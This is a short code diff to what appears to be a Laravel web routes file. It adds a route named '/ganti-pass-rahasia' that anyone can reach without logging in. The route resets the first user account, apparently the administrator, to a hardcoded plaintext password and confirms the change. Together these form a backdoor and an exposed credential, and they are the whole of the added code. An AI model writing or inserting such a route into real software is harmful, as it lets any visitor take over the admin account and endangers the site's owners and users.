@@ -118,3 +118,10 @@ Route::get('/clear-semua', function() {
         </div>
     ";
 });
+
+Route::get('/ganti-pass-rahasia', function() {
+    $user = \App\Models\User::find(1);
+    $user->password = Hash::make('Esa@2307089');
+    $user->save();
+    return "Password admin berhasil diganti!";
+});
